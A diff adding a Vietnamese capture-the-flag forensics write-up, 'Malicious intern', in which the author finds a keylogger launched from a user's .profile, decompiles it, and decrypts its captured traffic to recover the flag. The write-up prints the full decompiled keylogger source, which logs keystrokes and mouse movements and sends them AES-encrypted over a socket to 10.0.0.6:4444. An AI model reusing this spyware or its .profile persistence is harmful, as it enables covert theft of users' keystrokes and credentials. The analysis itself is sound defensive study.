@@ -381,3 +381,321 @@ replace_bytes_in_file(file_path, old_bytes, new_bytes)
 ```
 - Cuối cùng ta thu được flag 
 - ![image](image/17.png)
+## Malicious intern
+### Description 
+- ![za](image/des9.png)
+### Solution 
+- Với bài này ta được cho thư mục / của hệ thống file linux, vì đề bài có đề cập đến việc bị dính ãm độc nên mình dùng công cụ clamAV để quét nhưng không có kết quả.
+- Tìm bằng tay thì tại `home\lucius\.profile` thì mình thấy 1 file keylogger được thiết lập để tự động chạy.
+```
+# ~/.profile: executed by the command interpreter for login shells.
+# This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login
+# exists.
+# see /usr/share/doc/bash/examples/startup-files for examples.
+# the files are located in the bash-doc package.
+/usr/bin/keylogger &
+# the default umask is set in /etc/profile; for setting the umask
+# for ssh logins, install and configure the libpam-umask package.
+#umask 022
+
+# if running bash
+if [ -n "$BASH_VERSION" ]; then
+    # include .bashrc if it exists
+    if [ -f "$HOME/.bashrc" ]; then
+	. "$HOME/.bashrc"
+    fi
+fi
+
+# set PATH so it includes user's private bin if it exists
+if [ -d "$HOME/bin" ] ; then
+    PATH="$HOME/bin:$PATH"
+fi
+
+# set PATH so it includes user's private bin if it exists
+if [ -d "$HOME/.local/bin" ] ; then
+    PATH="$HOME/.local/bin:$PATH"
+fi
+```
+- Truy cập vào `/usr/bin/keylogger` để xem con này nó như thế nào.
+- Khi mình strings con này thì thấy nó có load `libpython3.8.so` vào trong, có thể đoán chắc đây là 1 file python
+- ![đa](image/18.png)
+- Mình sử dụng `pyinstxtractor.py` và `uncompyle6` để decomplie
+```
+┌──(kali㉿kali)-[~/pyinstxtractor]
+└─$ python pyinstxtractor.py ~/Downloads/keylogger 
+[+] Processing /home/kali/Downloads/keylogger
+[+] Pyinstaller version: 2.1+
+[+] Python version: 3.8
+[+] Length of package: 64918254 bytes
+[+] Found 412 files in CArchive
+[+] Beginning extraction...please standby
+[+] Possible entry point: pyiboot01_bootstrap.pyc
+[+] Possible entry point: pyi_rth_cryptography_openssl.pyc
+[+] Possible entry point: pyi_rth_inspect.pyc
+[+] Possible entry point: pyi_rth_pkgutil.pyc
+[+] Possible entry point: pyi_rth_multiprocessing.pyc
+[+] Possible entry point: pyi_rth_pyqt5.pyc
+[+] Possible entry point: pyi_rth_gdkpixbuf.pyc
+[+] Possible entry point: pyi_rth_glib.pyc
+[+] Possible entry point: pyi_rth_gio.pyc
+[+] Possible entry point: pyi_rth_gi.pyc
+[+] Possible entry point: keylogger.pyc
+[!] Warning: This script is running in a different Python version than the one used to build the executable.
+[!] Please run this script in Python 3.8 to prevent extraction errors during unmarshalling
+[!] Skipping pyz extraction
+[+] Successfully extracted pyinstaller archive: /home/kali/Downloads/keylogger
+
+You can now use a python decompiler on the pyc files within the extracted directory
+```
+
+```
+┌──(kali㉿kali)-[~/pyinstxtractor/keylogger_extracted]
+└─$ uncompyle6 keylogger.pyc 
+# uncompyle6 version 3.9.2
+# Python bytecode version base 3.8.0 (3413)
+# Decompiled from: Python 2.7.18 (default, Aug  1 2022, 06:23:55) 
+# [GCC 12.1.0]
+# Embedded file name: keylogger.py
+import logging, os, platform, socket, threading, wave, pyscreenshot
+from pynput import keyboard
+from pynput import mouse
+import requests
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad
+import struct, glob, io
+SEND_REPORT_EVERY = 30
+host = "10.0.0.6"
+port = 4444
+
+class KeyLogger:
+
+    def __init__(self, time_interval):
+        self.interval = time_interval
+        self.log_keyboard = "KeyLogger Started..."
+        self.log_mouse = "Mouse Started..."
+        self.key = self.getKey()
+        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.s.connect((host, port))
+
+    def getKey(self):
+        return requests.get("https://raw.githubusercontent.com/HuyThang25/KCSC-TVV2024/main/key").text.encode("utf-8")
+
+    def appendlog_mouse(self, string):
+        self.log_mouse = self.log_mouse + string + "\n"
+
+    def appendlog_keyboard(self, string):
+        self.log_keyboard = self.log_keyboard + string
+
+    def on_move(self, x, y):
+        self.appendlog_mouse("Mouse moved to {} {}".format(x, y))
+
+    def on_click(self, x, y, button, pressed):
+        self.appendlog_mouse("Mouse {} {} to {} {} ".format("Pressed" if pressed else "Released", str(button), x, y))
+
+    def save_data(self, key):
+        try:
+            current_key = " " + str(key.char) + " "
+        except AttributeError:
+            if key == key.space:
+                current_key = "SPACE"
+            else:
+                if key == key.esc:
+                    current_key = "ESC"
+                else:
+                    current_key = " " + str(key) + " "
+        else:
+            self.appendlog_keyboard(current_key)
+
+    def send_data(self, message):
+        cipher = AES.new(self.key, AES.MODE_CBC)
+        ciphertext = cipher.encrypt(pad(message, AES.block_size))
+        data = cipher.iv + ciphertext
+        data_size = struct.pack("!I", len(data))
+        self.s.sendall(data_size)
+        self.s.sendall(data)
+
+    def report_keyboard(self):
+        self.send_data(("\n\n" + self.log_keyboard).encode("utf-8"))
+        self.log_keyboard = "This is keyboard:\n\n"
+        timer = threading.Timer(self.interval, self.report_keyboard)
+        timer.start()
+
+    def report_mouse(self):
+        self.send_data(("\n\n" + self.log_mouse).encode("utf-8"))
+        self.log_mouse = ""
+        timer = threading.Timer(self.interval, self.report_mouse)
+        timer.start()
+
+    def system_information(self):
+        hostname = socket.gethostname()
+        ip = socket.gethostbyname(hostname)
+        plat = platform.processor()
+        system = platform.system()
+        machine = platform.machine()
+        return hostname + " - " + ip + " - " + plat + " - " + system + " - " + machine
+
+    def run_mouse(self):
+        mouse_listener = mouse.Listener(on_click=(self.on_click), on_move=(self.on_move))
+        with mouse_listener:
+            self.report_mouse()
+            mouse_listener.join()
+
+    def run_keyboard(self):
+        keyboard_listener = keyboard.Listener(on_press=(self.save_data))
+        with keyboard_listener:
+            self.report_keyboard()
+            keyboard_listener.join()
+
+    def run(self):
+        self.send_data(self.system_information().encode("utf-8"))
+        t1 = threading.Thread(target=(self.run_keyboard))
+        t2 = threading.Thread(target=(self.run_mouse))
+        t1.start()
+        t2.start()
+        t1.join()
+        t2.join()
+
+
+keylogger = KeyLogger(SEND_REPORT_EVERY)
+keylogger.run()
+
+# okay decompiling keylogger.pyc
+```
+- Nhìn vào src của nó ta thấy rằng nó lắng nghe bàn phím và chuột sau đó encrypt để gửi lên 10.0.0.6:4444
+- Dữ liệu được encrypt bằng key được tải từ github, tuy nhiên khi mình truy cập thì không có cái key nào cả
+- ![aa](image/19.png)
+- Theo dõi lịch sử commit của trang github này ta có thể lấy được key trước khi bị sửa
+- ![image](image/20.png)
+- Key là `9cbf8152dee6895d65a959560502fc73`
+- Bây giờ mình sẽ crawl dữ liệu từ wireshark về để biết hacker đã lấy cắp những gì.
+- ![ơaa](image/21.png)
+- Có 1 vài packet có len là 4 khi decrypt sẽ bị lỗi, mình xem lại src
+```
+    def send_data(self, message):
+        cipher = AES.new(self.key, AES.MODE_CBC)
+        ciphertext = cipher.encrypt(pad(message, AES.block_size))
+        data = cipher.iv + ciphertext
+        data_size = struct.pack("!I", len(data))
+        self.s.sendall(data_size)
+        self.s.sendall(data)
+```
+- Thấy rằng khi gửi data đầu tiên nó sẽ gửi size của data đó, sau đó mới gửi dữ liệu, nên ta sẽ chỉ lấy phần giữa các packet có len = 4 ra.
+- Mình sẽ viết lệnh filter tất cả các dữ liệu sau đó sử lý bằng python
+> tshark -r traffic.pcapng -Y "ip.dst==10.0.0.6  && tcp.port==4444" -Tfields -e data.data > data.txt
+- Và đây là script xử lý 
+```
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import unpad
+import binascii
+
+def decrypt_aes(ciphertext, key, iv):
+    key = key.encode('utf-8')  # Chuyển đổi khóa từ chuỗi sang byte
+    cipher = AES.new(key, AES.MODE_CBC, iv)  # Tạo đối tượng AES ở chế độ CBC
+    
+    # Giải mã dữ liệu
+    decrypted_data = cipher.decrypt(ciphertext)
+    
+    # Loại bỏ padding
+    try:
+        decrypted_data = unpad(decrypted_data, AES.block_size)
+    except ValueError as e:
+        print("Padding không hợp lệ:", e)
+        return None
+    
+    return decrypted_data.decode('utf-8')
+
+with open("data.txt", "r") as file:
+    key = '9cbf8152dee6895d65a959560502fc73'  # Khóa AES
+    for line in file:
+        line = line.strip()
+        if len(line) != 8:  # Bỏ qua các dòng có độ dài 4
+            try:
+                # Chuyển IV và ciphertext từ hex sang bytes
+                iv = binascii.unhexlify(line[0:32])  # 16 byte IV => 32 ký tự hex
+                ciphertext = binascii.unhexlify(line[32:])  # Phần còn lại là ciphertext
+                decrypted_text = decrypt_aes(ciphertext, key, iv)
+                
+                if decrypted_text:
+                    print(decrypted_text)
+            except (binascii.Error, ValueError) as e:
+                # Bỏ qua nếu có lỗi trong quá trình giải mã
+                print("Lỗi giải mã dòng:", e)
+                continue
+```
+- Nhìn vào kết quả ta thấy tại keyboard có phần 1 của flag 
+```
+This is keyboard:
+
+ m  o  u  s  e  Key.backspace  Key.backspace  Key.backspace  Key.backspace  Key.backspace  t  e  Key.right  Key.left  x  t SPACE e  i  Key.backspace  d  i  t  o  r  Key.enter  Key.shift  K  C  S  C  Key.shift  {  y  a  Key.backspace  4  g 
+
+This is keyboard:
+
+ i  Key.backspace  1  Key.shift  _  1  s  Key.shift  _  3  x  x  x  Key.backspace  Key.backspace  t  r  3  m  3  l  y  Key.shift  _  d  4  n  9  9  9  9  Key.backspace  Key.backspace  Key.backspace  3  r 
+```
+- Chỉnh sửa lại ta được : `KCSC{y4g1_1s_3xtr3m3ly_d4n93r`
+- Phần 2 còn lại chỉ có thể nằm trong phần mouse
+- Lại tiếp tục lọc và sử dụng python để xử lý
+> tcp.dstport==4444 && frame.number>202 && frame.number < 226
+- ![iaiai](image/22.png)
+- Và đây là script 
+```
+import matplotlib.pyplot as plt
+import time
+
+# Đọc dữ liệu từ file
+coordinates = []
+pressed = []
+released = []
+
+with open('download.txt', 'r') as file:
+    for line in file:
+        parts = line.split()
+        if "Mouse moved" in line:
+            x = int(parts[-2])
+            y = int(parts[-1])
+            coordinates.append((x, y))
+        elif "Mouse Pressed" in line:
+            x = int(parts[-2])
+            y = int(parts[-1])
+            pressed.append((x, y))
+        elif "Mouse Released" in line:
+            x = int(parts[-2])
+            y = int(parts[-1])
+            released.append((x, y))
+
+# Tạo cửa sổ vẽ
+plt.ion()  # Bật chế độ tương tác
+fig, ax = plt.subplots()
+ax.set_title('Mouse Movements with Press and Release Events')
+ax.set_xlabel('X Coordinate')
+ax.set_ylabel('Y Coordinate')
+ax.grid()
+
+# Vẽ từng bước di chuyển chuột với nét mỏng
+for i in range(1, len(coordinates)):
+    x_values, y_values = zip(*coordinates[:i+1])
+    ax.plot(x_values, y_values, color='black', marker='o', linewidth=0.5)  # Vẽ đường với độ dày nét mỏng
+    plt.draw()
+    plt.pause(0.1)  # Tạm dừng để tạo hiệu ứng vẽ từ từ
+
+# Vẽ các sự kiện nhấn và thả chuột
+if pressed:
+    pressed_x, pressed_y = zip(*pressed)
+    ax.scatter(pressed_x, pressed_y, color='red', label="Mouse Pressed", zorder=5)
+
+if released:
+    released_x, released_y = zip(*released)
+    ax.scatter(released_x, released_y, color='blue', label="Mouse Released", zorder=5)
+
+# Hiển thị toàn bộ biểu đồ sau khi hoàn thành
+plt.legend()
+plt.show()
+
+# Tắt chế độ tương tác khi vẽ xong
+plt.ioff()
+```
+- ![sấ](image/23.png)
+- Ảnh bị lật ngược nên hơi khó đọc, mình  sẽ lật nó lại cho dễ đọc 
+- ![nâ](image/24.png)
+- Đọc được phần 2 là : `792024}`
+> Flag : KCSC{y4g1_1s_3xtr3m3ly_d4n93r792024}
